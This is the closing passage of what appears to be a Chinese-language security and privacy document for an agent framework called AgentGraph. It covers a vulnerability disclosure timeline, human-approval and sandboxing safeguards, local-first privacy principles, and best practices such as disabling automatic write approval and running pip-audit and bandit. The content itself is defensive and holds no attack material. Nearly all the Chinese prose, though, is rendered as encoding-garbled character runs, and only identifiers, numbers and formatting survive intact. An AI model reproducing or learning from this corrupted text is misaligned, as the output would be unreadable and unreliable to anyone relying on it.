1. å‘ç°æ¼æ´åï¼Œè¯·ç§ä¸‹æŠ¥å‘Šï¼ˆä¸å…¬å¼€æŠ«éœ²ï¼‰
2. æˆ‘ä»¬å°†åœ¨ **7 ä¸ªå·¥ä½œæ—¥**å†…å“åº”
3. ä¿®å¤åï¼Œæˆ‘ä»¬å°†åœ¨ **90 å¤©å†…**å‘å¸ƒè¡¥ä¸
4. å…¬å¼€æŠ«éœ²æ—¶ä¼šè‡´è°¢å®‰å…¨ç ”ç©¶äººå‘˜

---

## 14. æ€»ç»“

AgentGraph æ¡†æ¶é€šè¿‡å¤šå±‚é˜²æŠ¤æœºåˆ¶å®ç°å®‰å…¨å’Œéšç§ä¿æŠ¤ï¼š

**å®‰å…¨ä¸‰å¤§æ”¯æŸ±**ï¼š
1. **HITL äººæœºååŒ** - å››å±‚å®¡æ‰¹è§„åˆ™æ‹¦æˆªå±é™©æ“ä½œ
2. **å·¥ä½œåŒºéš”ç¦»** - æ–‡ä»¶ç³»ç»Ÿæ²™ç®±é˜²æ­¢è·¯å¾„éå†
3. **é…ç½®åŒ–å®‰å…¨** - çµæ´»çš„å®‰å…¨ç­–ç•¥é€‚é…ä¸åŒç¯å¢ƒ

**éšç§ä¿æŠ¤åŸåˆ™**ï¼š
- âœ… **æœ¬åœ°ä¼˜å…ˆ** - æ‰€æœ‰æ•°æ®ä¿å­˜æœ¬åœ°
- âœ… **æœ€å°åŒ–** - ä»…æ”¶é›†å¿…è¦ä¿¡æ¯
- âœ… **é€æ˜** - ç”¨æˆ·å¯ç›´æ¥è®¿é—®æ•°æ®
- âœ… **å¯æ§** - ç”¨æˆ·å¯åˆ é™¤æ‰€æœ‰æ•°æ®

**å®‰å…¨æœ€ä½³å®è·µ**ï¼š
- ç”Ÿäº§ç¯å¢ƒå…³é—­ `AUTO_APPROVE_WRITES`
- å¯ç”¨ HITL å…¨å±€é£é™©æ¨¡å¼
- å®šæœŸè¿è¡Œå®‰å…¨æ‰«æï¼ˆ`pip-audit`, `bandit`ï¼‰
- å®¡æŸ¥å®¡æ‰¹æ—¥å¿—ï¼Œå‘ç°å¼‚å¸¸è¡Œä¸º

**æŒç»­æ”¹è¿›**ï¼š
æ¡†æ¶å®‰å…¨ç‰¹æ€§å°†æŒç»­æ¼”è¿›ï¼Œæ¬¢è¿ç¤¾åŒºè´¡çŒ®å’Œå®‰å…¨ç ”ç©¶äººå‘˜çš„åé¦ˆã€‚

---

**æ–‡æ¡£ç‰ˆæœ¬**: v1.0
**æœ€åæ›´æ–°**: 2025-10-31
**ç»´æŠ¤è€…**: Security Team
